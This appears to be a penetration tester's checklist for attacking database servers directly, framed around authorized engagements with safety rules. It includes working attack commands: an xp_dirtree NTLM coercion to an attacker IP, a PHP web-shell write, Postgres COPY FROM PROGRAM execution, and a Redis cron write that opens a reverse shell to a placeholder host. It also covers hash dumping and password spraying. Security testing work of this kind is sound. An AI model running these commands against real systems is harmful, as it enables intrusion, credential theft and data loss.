---
tags:
  - hack-notes
  - checklist
  - database
  - infrastructure
---

# Database Security Testing Checklist

> Use when assessing database servers directly (not via an application front-end): configuration, authentication, privilege model, and server-level exploitation across MSSQL, MySQL/MariaDB, PostgreSQL, Oracle, MongoDB, Redis, and Elasticsearch. App-tier SQL injection lives in [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md); this checklist targets the DBMS itself.

## Table of Contents
- [1. Pre-Engagement and Scoping](#1-pre-engagement-and-scoping)
- [2. Discovery and Enumeration](#2-discovery-and-enumeration)
- [3. Authentication](#3-authentication)
- [4. Privilege and Configuration Review](#4-privilege-and-configuration-review)
- [5. MSSQL-Specific](#5-mssql-specific)
- [6. MySQL and PostgreSQL-Specific](#6-mysql-and-postgresql-specific)
- [7. Oracle-Specific](#7-oracle-specific)
- [8. NoSQL and Cache (MongoDB, Redis, Elasticsearch)](#8-nosql-and-cache-mongodb-redis-elasticsearch)
- [9. Post-Exploitation](#9-post-exploitation)
- [Recent Techniques (2024-2026)](#recent-techniques-2024-2026)
- [Reporting and Evidence](#reporting-and-evidence)
- [Tools and References](#tools-and-references)
- [Related](#related)

---

## 1. Pre-Engagement and Scoping

Database engagements are high blast radius. A single bad query against production can delete tables, lock rows, or trigger failover. Nail scope and safety rails before touching a listener.

### Scope Definition
- [ ] **Confirm in-scope instances:** Get an explicit list of host/IP, port, instance name, and DBMS type. Wildcard "all databases on subnet X" still needs each instance enumerated and confirmed.
- [ ] **Identify environment per instance:** Mark each as prod, staging, dev, or DR. Replicas and DR mirrors are often forgotten and may be live.
- [ ] **Credentialed vs uncredentialed:** Establish whether you have valid DB creds, OS creds on the host, or a black-box external view. Decide whether to test both an unauthenticated and authenticated perspective.
- [ ] **Cloud-managed vs self-hosted:** RDS, Azure SQL, Cloud SQL, Atlas, and Elastic Cloud disable many host-level primitives (xp_cmdshell, COPY FROM PROGRAM, MODULE LOAD). Confirm so you do not waste cycles or mis-report. Managed-platform IAM and network config move to [AWS Pentest](../Cheatsheets/AWS%20Pentest.md) / [Azure and Entra ID](../Cheatsheets/Azure%20and%20Entra%20ID.md).

### Safety and Rules of Engagement
- [ ] **No destructive queries on prod:** No DROP, DELETE, TRUNCATE, UPDATE without WHERE, or schema changes against production. Read-only by default.
- [ ] **Wrap writes in transactions where unavoidable:** On any system where a write is authorized, use `BEGIN TRAN ... ROLLBACK` (MSSQL) or `BEGIN; ... ROLLBACK;` patterns to prove access without persisting change.
- [ ] **Backup awareness:** Confirm a recent, restorable backup exists before any state-changing test. Get the client to confirm restore has been tested, not just that backups run.
- [ ] **Resource-exhaustion caution:** Avoid unbounded `SELECT *` on large tables, cartesian joins, and high-thread brute force that can saturate the server. Cap query result sizes.
- [ ] **Maintenance window for intrusive tests:** Schedule RCE primitives, restarts, replication abuse, and brute force inside an agreed window with a rollback owner on call.
- [ ] **Data handling:** Define what counts as sensitive (PII, PHI, secrets) and how you prove access without exfiltrating bulk data. Count rows and screenshot column names rather than dumping content.

```
⚠️ DESTRUCTIVE-OP WARNING
Redis FLUSHALL, MongoDB dropDatabase, MSSQL/Postgres replication or linker reconfiguration,
and any UDF/module write can corrupt or destroy live data and have been weaponized by
ransomware crews. Never run them against prod without written authorization and a tested
restore. Treat "prove access" as read-only and bounded.
```

---

## 2. Discovery and Enumeration

Goal: find every reachable database service, fingerprint version precisely, and flag anything that answers without authentication.

### Port and Service Detection
- [ ] **Sweep default DB ports** across in-scope ranges. Confirm the listener actually speaks the protocol, not just an open port.

| DBMS | Default port(s) | Notes |
|---|---|---|
| MSSQL | 1433/tcp, 1434/udp (SQL Browser) | UDP 1434 enumerates named instances and dynamic ports |
| MySQL / MariaDB | 3306/tcp | 33060 for X Protocol |
| PostgreSQL | 5432/tcp | 6432 if PgBouncer fronts it |
| Oracle | 1521/tcp (TNS), 1522-1529 | EM/console on 5500/8080 |
| MongoDB | 27017/tcp, 27018-27019 | 28017 legacy HTTP status |
| Redis | 6379/tcp | 16379 cluster bus, 26379 Sentinel |
| Elasticsearch | 9200/tcp (HTTP), 9300/tcp (transport) | Kibana 5601 |

- [ ] **Run service/version NSE scripts:** `nmap -sV -p <ports> --script "<dbms>-info,<dbms>-enum-*" <target>`. Capture banner and exact build.
- [ ] **MSSQL instance enumeration:** Query UDP 1434 (`nmap --script ms-sql-info,broadcast-ms-sql-discover`) to list named instances and their dynamic TCP ports.
- [ ] **Oracle SID/service enumeration:** TNS listener may leak SIDs/service names directly (`tnscmd10g`, `nmap --script oracle-sid-brute`, ODAT `sidguesser`/`snguesser`). A valid SID is prerequisite for auth tests.

### Version Fingerprint
- [ ] **Pin exact build numbers**, not just major versions. CVE applicability hinges on patch level (e.g., Redis 7.2.10 vs 7.2.11, Postgres 14.15 vs 14.16).
- [ ] **Map build to known-vuln state:** Cross-reference fingerprint against vendor advisories and the [Recent Techniques (2024-2026)](#recent-techniques-2024-2026) list below before declaring an area clean.

### Exposed and Unauthenticated Surface
- [ ] **Test every service for anonymous/no-auth access** before any credentials. This is the single highest-value finding for NoSQL/cache.
  - [ ] Redis: `redis-cli -h <ip> ping` returns `PONG`, then `INFO` / `CONFIG GET *` without `AUTH` = unauthenticated.
  - [ ] MongoDB: `mongosh "mongodb://<ip>:27017"` then `show dbs` / `db.adminCommand({listDatabases:1})` succeeds = unauthenticated.
  - [ ] Elasticsearch: `curl http://<ip>:9200/_cat/indices?v` and `/_cluster/health` return data = unauthenticated. Check `/_security/user` for auth status.
  - [ ] MySQL/Postgres/MSSQL: try anonymous/empty-password and trust-auth connections (see Phase 3).
- [ ] **Check for internet exposure** of any instance that should be internal-only. Note bind address (`0.0.0.0` vs loopback) and firewall posture.

---

## 3. Authentication

### Default and Weak Credentials
- [ ] **Test documented default accounts per DBMS** before brute force.

| DBMS | Common default/weak accounts |
|---|---|
| MSSQL | `sa` (blank or weak), domain service accounts |
| MySQL/MariaDB | `root` blank, `root@localhost`, debian-sys-maint |
| PostgreSQL | `postgres` / `postgres`, trust-auth local |
| Oracle | `system/manager`, `sys/change_on_install`, `scott/tiger`, `dbsnmp/dbsnmp`, `outln/outln` |
| MongoDB | none if unauth; `admin/admin` on weak deploys |
| Redis | no user; weak `requirepass` if set |
| Elasticsearch | `elastic` / `changeme`, `kibana_system` |

- [ ] **Spray known org passwords** (season+year, company name patterns) before deep brute force.

### Brute Force with Lockout Awareness
- [ ] **Check lockout/audit policy first.** MSSQL `sa` often has no lockout; AD-backed logins inherit domain lockout policy and brute force can lock real users. Confirm threshold and observation window before spraying.
- [ ] **Throttle and use known usernames** rather than blasting full lists. Prefer one password across many users (spray) over many passwords on one user when lockout is in play. AD spray methodology is in [Internal Network and Active Directory](Internal%20Network%20and%20Active%20Directory.md).
- [ ] **Use the right tooling per service:** `hydra`, `medusa`, `nmap <dbms>-brute` NSE, or `sqlmap` for SQLi-reachable DBs. For MSSQL via NetExec/Impacket see [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md).
  ```bash
  nxc mssql <target> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
  ```
- [ ] **Record exactly which credential/protocol succeeded** and the privilege level it grants.

### Anonymous and Trust Auth
- [ ] **PostgreSQL pg_hba.conf trust:** local or host lines set to `trust` authenticate with no password. Test connecting from each network position you control.
- [ ] **MySQL host-based / unix_socket auth:** accounts scoped to `%` or `localhost`, plus anonymous `''@host` rows in `mysql.user`. Enumerate `SELECT user,host,plugin FROM mysql.user;`.
- [ ] **MSSQL Windows-auth fallthrough:** test integrated auth as your current/coerced token. Guest/public mappings can grant unexpected DB access.

### Hash Extraction and Cracking
- [ ] **Dump credential stores once authenticated** (read-only) for offline cracking and reuse mapping.
  - [ ] MSSQL: `SELECT name, password_hash FROM sys.sql_logins;`
  - [ ] MySQL: `SELECT user, authentication_string FROM mysql.user;`
  - [ ] PostgreSQL: `SELECT usename, passwd FROM pg_shadow;` (md5/SCRAM-SHA-256)
  - [ ] Oracle: `SELECT name, password, spare4 FROM sys.user$;`
- [ ] **Crack with hashcat/john** using the correct mode (MSSQL 2012+ = mode 1731, MySQL SHA1 = 300, Postgres SCRAM = 28600, Oracle 12c = 12300). Map every cracked password to credential-reuse candidates.
- [ ] **Capture MSSQL NTLM hashes via UNC coercion** for relay/cracking. See Phase 5 and [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md).

---

## 4. Privilege and Configuration Review

Once authenticated, map the privilege model and config against least-privilege and CIS-style baselines. Most server-level RCE depends on an over-privileged principal plus a dangerous feature left enabled.

### Roles, Grants, and Privilege Model
- [ ] **Enumerate the current principal's effective privileges** and server-level role memberships (sysadmin, SUPER, superuser, DBA).
- [ ] **Audit the public/default role.** Permissions granted to `public` (MSSQL `public`, Postgres `PUBLIC`, Oracle `PUBLIC`) apply to every login. Look for EXECUTE on dangerous procs, SELECT on sensitive tables, or excessive grants.
  - [ ] Oracle: `PUBLIC` execute on `UTL_FILE`, `UTL_HTTP`, `UTL_TCP`, `DBMS_ADVISOR`, `DBMS_SCHEDULER` is a classic privesc/SSRF vector.
- [ ] **Find over-privileged application accounts.** App service accounts running as DBA/sysadmin are a top finding. Each app should hold only the rights it uses.
- [ ] **Check for accounts granting ALTER/CONTROL/GRANT-option** that allow self-escalation.
- [ ] **Enumerate stored procedures/functions for privilege boundaries** (definer vs invoker rights, MSSQL ownership chaining, Postgres SECURITY DEFINER functions writable by lower-priv users).

### Encryption
- [ ] **In transit:** Confirm TLS is enforced, not merely available. Test whether the server accepts cleartext (MySQL `--ssl-mode`, Postgres `sslmode=disable`, MSSQL Force Encryption flag). Capture a handshake to prove cleartext acceptance.
- [ ] **At rest:** Check for TDE (MSSQL/Oracle), Postgres disk/column encryption, MongoDB encrypted storage engine. Note unencrypted backups and data files.
- [ ] **Cert validation:** Self-signed or expired certs that clients trust blindly enable MITM. Cross-check with any TNS/listener interception in Phase 7.

### Audit, Logging, and Exposure
- [ ] **Audit/logging enabled:** Confirm login auditing, DDL/DML auditing where required, and that logs are shipped off-box. Absence of audit is itself a finding.
- [ ] **Network exposure:** Re-confirm bind address and firewall rules from Phase 2. Database listening on `0.0.0.0` with no network ACL is a high finding.
- [ ] **CIS-style config sweep** per DBMS: dangerous features disabled (xp_cmdshell, OLE Automation, COPY PROGRAM, MODULE/UDF dirs), guest accounts removed, sample DBs dropped, error verbosity limited, default ports/instance names noted.
- [ ] **Secrets in DB config/objects:** connection strings, linked-server credentials, cloud keys, and app secrets stored in tables, jobs, or config. Enumerate (read-only) and report.

---

## 5. MSSQL-Specific

MSSQL is the richest server-level target in AD environments. Chain impersonation, linked servers, and OS-command primitives, and coerce NTLM for relay.

### OS Command Execution
- [ ] **xp_cmdshell:** Check state (`SELECT value FROM sys.configurations WHERE name='xp_cmdshell'`). If disabled but you are sysadmin, you can re-enable via `sp_configure` (this is a config change: confirm authorization and revert after).
  ```sql
  EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```
- [ ] **OLE Automation procedures:** `sp_OACreate`/`sp_OAMethod` (wscript.shell via odsole70.dll) as an alternate exec path when xp_cmdshell is locked. NetExec/mssqlclient/SQLRecon automate this.
- [ ] **CLR assembly loading:** custom CLR assembly for code exec where TRUSTWORTHY or signed-assembly conditions allow. Note `clr enabled` and `clr strict security` state.

### Impersonation and Trust Chains
- [ ] **Enumerate impersonable principals:** `SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE';` then `EXECUTE AS LOGIN = '<sa-or-priv>'`. Public-to-sysadmin via a permitted IMPERSONATE grant is a common privesc.
- [ ] **Enumerate linked servers:** `SELECT * FROM sys.servers WHERE is_linked=1;` and `EXEC sp_linkedservers;`. Note remote login mapping and `rpc out` state.
- [ ] **Hop linked-server trust chains:** `SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')')`. Chain across multiple hops (SQL01 -> SQL02 -> SQL03) where each link runs as a privileged remote account. mssqlclient and SQLRecon support multi-hop linked-chain execution.
- [ ] **Combine impersonation + linked server** to reach sysadmin on a remote instance even when local rights are limited.

### SQL Agent and Jobs
- [ ] **SQL Agent jobs as exec path:** Create/modify a job with a CmdExec or PowerShell step (authorization required). Enumerate existing jobs for stored credentials and proxy accounts (`msdb.dbo.sysjobs`, `sysproxies`).

### NTLM Coercion to Capture/Relay
- [ ] **Coerce outbound NTLM** with a UNC path procedure to capture or relay the SQL service account hash.
  ```sql
  EXEC master..xp_dirtree '\\<attacker-ip>\share', 1, 1;
  -- alternates: xp_fileexist, xp_subdirs, sp_OACreate file methods, BACKUP DATABASE TO DISK='\\attacker\x'
  ```
- [ ] **Capture or relay** with Responder (capture) or ntlmrelayx/NetExec (relay). The SQL service account is frequently privileged on the host or domain.
- [ ] **Relay to ADCS (ESC8) or LDAP** where EPA/channel-binding is not enforced, to mint a certificate or perform RBCD. Full relay methodology in [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md) and the ADCS chain in [Internal Network and Active Directory](Internal%20Network%20and%20Active%20Directory.md).

### Active Directory Integration
- [ ] **Map AD logins to DB roles:** Windows-auth logins inherit group membership. A compromised domain user may already hold DB rights.
- [ ] **Note SCCM/MECM-backed instances:** site DB on MSSQL is a high-value target. SQLRecon has dedicated SCCM modules executable under an impersonated context.

---

## 6. MySQL and PostgreSQL-Specific

Both expose file-write and code-exec primitives gated behind privileges. Confirm the privilege, then the feature state, then exploit only with authorization.

### MySQL / MariaDB
- [ ] **FILE privilege:** `SELECT current_user(); SHOW GRANTS;` for `FILE`. With it, read host files (`LOAD_FILE('/etc/passwd')`) and write files (`SELECT ... INTO OUTFILE`).
- [ ] **secure_file_priv check:** `SHOW VARIABLES LIKE 'secure_file_priv';`. Empty value = read/write anywhere; a path = restricted; NULL = disabled. This gates OUTFILE/LOAD_FILE.
- [ ] **Web shell write** where the DB user can write into a web root and the box is also a web server:
  ```sql
  SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/x.php';
  ```
- [ ] **UDF code execution:** With FILE priv and a writable plugin dir, write a malicious shared object (`lib_mysqludf_sys`) and `CREATE FUNCTION sys_exec ... SONAME`. Confirm `plugin_dir` and write access first.
- [ ] **Secrets harvest:** dump `mysql.user`, app config tables, and any stored connection strings/API keys (read-only).

### PostgreSQL
- [ ] **Superuser / pg_execute_server_program check:** `SELECT current_user, usesuper FROM pg_user WHERE usename=current_user;` and role membership in `pg_execute_server_program`.
- [ ] **COPY FROM/TO PROGRAM RCE:** the headline Postgres server-RCE. Runs commands as the postgres OS user.
  ```sql
  DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(line text);
  COPY cmd_out FROM PROGRAM 'id; hostname';
  SELECT * FROM cmd_out;
  ```
  Note: `COPY ... TO PROGRAM` is disabled by default on recent builds; confirm state. Reachable via SQLi too (sqlmap `--os-shell` on Postgres uses this).
- [ ] **Large-object / lo_import file read-write:** `lo_import('/etc/passwd')` and `lo_export` for host file read/write where superuser.
- [ ] **UDF via shared library:** `CREATE FUNCTION ... AS '/path/lib.so'` for code exec on builds where COPY PROGRAM is blocked but library load is not.
- [ ] **Web shell / secrets** as with MySQL where a writable web root or stored secrets exist.

---

## 7. Oracle-Specific

Oracle's attack surface starts at the TNS listener and runs through default accounts and PL/SQL. ODAT is the workhorse.

### TNS Listener
- [ ] **Listener enumeration and info leak:** `tnscmd10g version/status`, ODAT, or `nmap oracle-tns-version`. Older listeners leak status/services without auth.
- [ ] **TNS poisoning (CVE-2012-1675):** on unpatched listeners with no local registration restriction, register a rogue service to MITM client connections and hijack sessions. ODAT `tnspoison` module. Intrusive: window + authorization required.
- [ ] **TNS protocol CVEs:** check fingerprint against recent listener advisories (e.g., CVE-2025-30733 class) before declaring the listener clean.

### Default Accounts and SID Discovery
- [ ] **Enumerate SIDs/service names** (`sidguesser`, `snguesser`) then test default accounts (`passwordguesser`) from the table in Phase 3. Oracle ships dozens of default schemas; many remain with default or locked-but-resettable passwords.

### PL/SQL and Privilege Escalation
- [ ] **Dangerous package access:** EXECUTE on `DBMS_SCHEDULER`, `DBMS_JAVA`, `UTL_FILE`, `UTL_HTTP`, `UTL_TCP`, `DBMS_ADVISOR`. These enable OS-command (Java/Scheduler), file read/write (UTL_FILE), and SSRF/exfil (UTL_HTTP/TCP).
- [ ] **PL/SQL injection in definer-rights packages:** a SQL-injectable package owned by SYS can run as SYS. Enumerate AUTHID and known-vulnerable built-in packages.
- [ ] **ODAT exploitation modules:** `utlfile`, `externaltable`, `dbmsscheduler`, `java` for file read/write and command execution once authenticated. Confirm privilege and authorization.
- [ ] **Privilege escalation to DBA:** chain `CREATE ANY PROCEDURE` / `CREATE ANY TRIGGER` / `ANALYZE ANY` and definer-rights tricks to reach DBA/SYS.

---

## 8. NoSQL and Cache (MongoDB, Redis, Elasticsearch)

These default to no authentication and are the most-ransomed database class on the internet. Unauthenticated access alone is usually a high/critical finding.

### MongoDB
- [ ] **Unauthenticated access:** if Phase 2 confirmed no auth, enumerate `show dbs`, `db.getCollectionNames()`, and sample documents (read-only, count rather than dump). Unauth Mongo = direct data compromise.
- [ ] **Auth/authorization gaps when authenticated:** check `db.getUsers()`, role scoping, and whether the connecting user has clusterAdmin/root.
- [ ] **Server-side JS / injection:** legacy `$where`, `mapReduce`, and `eval` if enabled. NoSQL operator injection from the app tier belongs in [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md).
- [ ] **Ransom-note check:** look for tell-tale `READ_ME`/`RECOVER`/`README_TO_RECOVER` databases indicating prior compromise; report immediately.
- [ ] **Memory-disclosure CVE check:** test fingerprint against MongoBleed-class unauth memory leaks (see Recent Techniques).

### Redis
- [ ] **Unauthenticated access:** `redis-cli -h <ip> INFO` / `CONFIG GET *`. No `requirepass` = unauthenticated. Note `protected-mode` state.
- [ ] **Read sensitive keys** (read-only): `KEYS *` (caution on large prod), `SCAN`, then `GET`/`TYPE` on interesting keys (sessions, tokens, cached creds).
- [ ] **RCE via cron write** (Linux, Redis writable to a cron dir):
  ```bash
  redis-cli -h <ip> config set dir /var/spool/cron/
  redis-cli -h <ip> config set dbfilename root
  redis-cli -h <ip> set x "\n* * * * * /bin/bash -c 'sh -i >& /dev/tcp/ATT/4444 0>&1'\n"
  redis-cli -h <ip> save
  ```
- [ ] **RCE via SSH authorized_keys write:** set `dir` to a user's `.ssh`, `dbfilename authorized_keys`, store your public key, `save`, then SSH in.
- [ ] **RCE via malicious module (MODULE LOAD):** master/slave replication trick streams a malicious `.so` to the target, then `MODULE LOAD` registers a `system.exec` command (Redis 4.x/5.x `redis-rce`). Confirm module loading is not disabled.
- [ ] **Lua sandbox / use-after-free RCE:** test build against RediShell (CVE-2025-49844) in the Recent Techniques list.
- [ ] **Ransom/wipe indicators:** unexpected keys, `FLUSHALL` history, or backup-disabled config.

### Elasticsearch
- [ ] **Unauthenticated access:** `/_cat/indices`, `/_cluster/health`, `/_search` without creds = data exposure. Check `/_security/user` and whether X-Pack security is enabled.
- [ ] **Read index data** (read-only, scoped): identify sensitive indices, sample documents, count records.
- [ ] **Snapshot/restore and path abuse:** check `path.repo` and snapshot APIs that can read/write host paths.
- [ ] **Known CVEs and DoS:** test fingerprint against recent Elastic advisories (unauth node-crash/OOM, info-disclosure). A single malformed request can DoS a node: confirm authorization before triggering.
- [ ] **Ransom-note indices:** look for index names demanding payment indicating prior compromise.

---

## 9. Post-Exploitation

Once you hold DB access or OS exec on the host, demonstrate impact and pivot, staying within authorized scope.

### Data Access and Impact
- [ ] **Demonstrate sensitive-data reach** with minimal proof: table/collection names, column names, row counts, and one redacted sample record. Avoid bulk exfiltration.
- [ ] **Enumerate stored secrets** usable elsewhere: app credentials, API/cloud keys, linked-server logins, connection strings, JWT signing keys.

### Pivot from DB to OS
- [ ] **Land an OS foothold** using the Phase 5-8 exec primitives (xp_cmdshell, COPY PROGRAM, UDF, Redis cron/SSH, Oracle Scheduler/Java). Note the OS account the DBMS runs as (often privileged: `mssql`, `postgres`, `mysql`, NT service accounts).
- [ ] **Local privilege escalation** from that account: see [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md) / [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md). DB service accounts often have SeImpersonate (Windows) or sudo/cron paths (Linux).

### Credential Reuse and Lateral Movement
- [ ] **Replay cracked/recovered DB and OS creds** across other hosts and services. DB passwords are heavily reused. Spray with NetExec per [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md).
- [ ] **Relay coerced MSSQL NTLM** into AD targets (LDAP/ADCS/SMB) per Phase 5 and [Internal Network and Active Directory](Internal%20Network%20and%20Active%20Directory.md).
- [ ] **Pivot through the DB host** into segmented networks the DB can reach (DBs often sit in a trusted tier). Tunnel and route per [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md).
- [ ] **Map trust relationships** between DB instances (linked servers, replication, DB links) as a lateral-movement graph.

---

## Recent Techniques (2024-2026)

- [ ] **CVE-2025-49844 "RediShell" (CVSS 10.0):** 13-year-old Lua use-after-free in Redis; crafted Lua script manipulates the GC to escape the script sandbox and achieve RCE. Test for: Redis below 6.2.20 / 7.2.11 / 7.4.6 / 8.0.4 / 8.2.2 with any Lua scripting reachable. Massive unauth-exposed install base.
- [ ] **CVE-2025-1094 PostgreSQL psql SQLi to RCE:** invalid-UTF-8 handling in libpq/psql enables SQL injection and meta-command abuse for RCE; chained with BeyondTrust CVE-2024-12356 for unauth RCE in the wild. Test for: Postgres below 13.19/14.16/15.11/16.7/17.3 and any libpq client fed attacker input.
- [ ] **CVE-2025-14847 "MongoBleed" (unauth memory leak):** zlib-compression handling leaks uninitialized server memory (credentials, tokens, API keys) with no authentication; exploited in the wild against tens of thousands of exposed servers. Test for: vulnerable MongoDB builds answering on 27017 without auth.
- [ ] **MSSQL UNC coercion to ADCS/LDAP relay:** `xp_dirtree`/`xp_fileexist`/`sp_OACreate` coerce the SQL service-account NTLM; relay to ADCS ESC8 or LDAP/RBCD where EPA/channel-binding is not enforced. Test for: relayable NTLM from a SQL instance plus an HTTP/LDAP target lacking EPA. Note Windows Server 2025 enables EPA/channel-binding by default, raising the bar.
- [ ] **Postgres COPY FROM PROGRAM as primary server-RCE:** still the go-to once superuser/pg_execute_server_program is held; `COPY ... TO PROGRAM` disabled by default on patched builds, so confirm state. sqlmap `--os-shell` automates it.
- [ ] **Redis MODULE LOAD via rogue replication master:** 4.x/5.x replication streams a malicious `.so`; `MODULE LOAD` registers `system.exec`. Test for: module loading enabled and outbound replication reachable.
- [ ] **Redis unauth cron/SSH-key write:** `CONFIG SET dir` + `dbfilename` to drop a cron job or `authorized_keys`. Test for: unauth Redis running as a user with a writable cron dir or home `.ssh`.
- [ ] **SQLRecon linked-chain + impersonation + SCCM modules:** multi-hop linked-server execution and SCCM/MECM site-DB attacks under an impersonated context. Test for: linked-server chains and any MSSQL backing an SCCM site.
- [ ] **Oracle TNS CVE-2025-30733 class:** recent TNS-protocol listener flaws; pair with classic TNS poisoning (CVE-2012-1675) on unrestricted listeners. Test for: listener fingerprint below patched build with no valid-node-checking/local-registration restriction.
- [ ] **Industrialized DB ransom/wipe campaigns:** automated scanners hit default ports, find unauth MongoDB/Redis/Elasticsearch, copy or delete data, and drop a ransom note. ~46% of exposed databases already carried a ransom/wipe note in recent studies. Test for: any internet-exposed unauthenticated instance and pre-existing ransom-note databases/indices.

---

## Reporting and Evidence

### Evidence to Capture per Finding
- [ ] **Connection proof:** the exact command/connection string and the authenticated banner or `SELECT @@version` / `INFO` / `_cluster/health` response (redact secrets).
- [ ] **Privilege proof:** output showing the principal and its role (`IS_SRVROLEMEMBER('sysadmin')`, `usesuper`, `db.getUsers()`).
- [ ] **Exec proof:** for any RCE, a benign command output (`id`/`whoami`/`hostname`) plus the OS account context. Never a destructive payload.
- [ ] **Coercion/relay proof:** captured NTLM hash or relay success log for MSSQL UNC findings.
- [ ] **Data-exposure proof:** table/index names, column names, and row counts. Redact actual records; one minimal sample if access proof is required.

### Severity Guidance
| Scenario | Typical severity |
|---|---|
| Unauthenticated DB exposing data (Mongo/Redis/ES) | Critical / High |
| Server-level RCE (xp_cmdshell, COPY PROGRAM, UDF, Redis module) | Critical |
| MSSQL NTLM coercion relayable to ADCS/AD privesc | Critical / High |
| Default/weak credentials granting DBA/sysadmin | High |
| Over-privileged app account, public-role abuse | Medium / High |
| Cleartext transport, missing audit, no encryption at rest | Medium / Low |

### False Positives to Rule Out
- [ ] **Managed-platform feature blocks:** xp_cmdshell, COPY PROGRAM, and MODULE LOAD are disabled on RDS/Azure SQL/Cloud SQL/Atlas. Do not report as exploitable without confirming the primitive actually runs.
- [ ] **`protected-mode` Redis:** binds only to loopback by default; remote `PONG` may be a tunnel/forward, not real exposure. Confirm the network path.
- [ ] **Disabled-but-resettable features:** xp_cmdshell off is not a clean pass if you are sysadmin and can re-enable; report the privilege, not just the toggle state.
- [ ] **Version-banner spoofing / WAF/proxy fronting:** confirm the live build via behavior, not just a banner, before mapping CVEs.
- [ ] **Read replica vs primary:** writes failing on a replica is not "no write access"; test the primary.

---

## Tools and References

| Tool | Use |
|---|---|
| `nmap` NSE (`ms-sql-*`, `mysql-*`, `oracle-*`, `mongodb-*`, `redis-info`) | discovery, version, instance enum, light brute |
| `sqlmap` | SQLi-reachable DBs, `--os-shell` (Postgres COPY PROGRAM, MSSQL xp_cmdshell) |
| NetExec (`nxc`) | MSSQL auth, spray, query/exec, linked servers, relay glue |
| Impacket `mssqlclient.py` | interactive MSSQL, xp_cmdshell, linked-chain, OLE, UNC coercion |
| Impacket `ntlmrelayx.py` / Responder | capture and relay coerced MSSQL NTLM |
| SQLRecon | MSSQL offensive recon/post-ex: impersonation, linked chains, SCCM |
| ODAT | Oracle SID/service enum, default creds, TNS poisoning, file/exec modules |
| `redis-cli` | Redis enum, key read, cron/SSH/module RCE primitives |
| `mongosh` / `curl` | MongoDB and Elasticsearch unauth enum and data access |
| `hashcat` / `john` | offline cracking of extracted DB hashes |

References: CIS Benchmarks per DBMS (MSSQL, MySQL, PostgreSQL, Oracle, MongoDB, Elasticsearch); vendor security advisories and release notes for patch-level CVE mapping; OWASP Testing Guide (WSTG) injection and configuration sections; HackTricks per-service pentesting pages; vendor hardening guides.

---

## Related

- Playbooks: [SQL Injection to RCE to Pivot](../Playbooks/SQL%20Injection%20to%20RCE%20to%20Pivot.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md)
- [Internal Network and Active Directory](Internal%20Network%20and%20Active%20Directory.md)
- [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md)
- [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md)
- [AWS Pentest](../Cheatsheets/AWS%20Pentest.md)
- [Azure and Entra ID](../Cheatsheets/Azure%20and%20Entra%20ID.md)
- [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md)
